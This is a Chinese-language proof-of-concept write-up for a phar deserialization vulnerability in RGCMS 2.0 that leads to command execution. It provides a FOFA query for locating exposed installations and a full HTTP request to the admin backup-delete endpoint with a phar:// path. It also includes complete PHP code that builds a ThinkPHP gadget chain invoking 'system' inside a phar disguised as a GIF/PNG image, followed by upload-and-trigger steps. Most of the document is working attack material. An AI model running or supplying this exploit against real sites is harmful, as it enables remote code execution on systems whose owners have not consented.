# RGCMS2.0存在phar反序列化漏洞

**RGCMS存在反序列化漏洞，攻击者可以通过该漏洞执行任意命令。**

## fofa

```javascript
"RGCMS"
```

## poc

```javascript
POST /admin.php/data/delbackup HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 212
Origin: http://rgcms:81
Connection: close
Referer: http://rgcms:81/admin.php/data/backuplist
Cookie: PHPSESSID=us9vfbgeh2i9c5kcp7h27ii8ns
Priority: u=0

title=20240820110529_rgcms.db&path=phar://upload/image/20240820/2057e04b4b2d528ed7726d233fc87191.png&children=&mtime=2024-08-20+11%3A05%3A29&size=1.09MB&type=file&ext=db&isReadable=true&isWritable=true&edit=false
```

**漏洞复现**

生成phar文件

```php
<?php
namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
        {
            $this->files = array($files);
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {
        protected $append = array("smi1e" => "1");
    }

    trait Attribute
    {
        private $data;
        private $withAttr = array("smi1e" => "system");

        public function get()
        {
            $this->data = array("smi1e" => "calc");
        }
    }
}
namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        public function __construct()
        {
            $this->get();
        }
    }
}

namespace {

    $conver = newthink\model\Pivot();
    $a = new think\process\pipes\Windows($conver);


    $phar = new Phar('hkey.phar');
    $phar -> stopBuffering();
    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($a);
    $phar -> stopBuffering();
}
?>
```

**把hkey.phar文件名修改为hkey.png**

**安装时RGCMS时选择数据库类型为：Sqlite**

![4e0412e97319c4cab7d8676d59484750](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502061633854.jpg)



**上传恶意的png文件：**

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502061633107.jpeg)

来到备份修复功能

![9427ecd99f1abb35cff8de1089d5211b](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502061633615.png)

![89c3630e24a51314c2328e9d0bfcecf6](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502061634669.jpg)

![90be81b23edef08235fbdec978300ad1](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502061634102.png)

**将数据包中path参数修改为**

**phar://upload/image/20240820/2057e04b4b2d528ed7726d233fc87191.png**

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502061634602.png)





## 漏洞来源

- https://mp.weixin.qq.com/s/WxffySGN33r-7ZJtD40BKA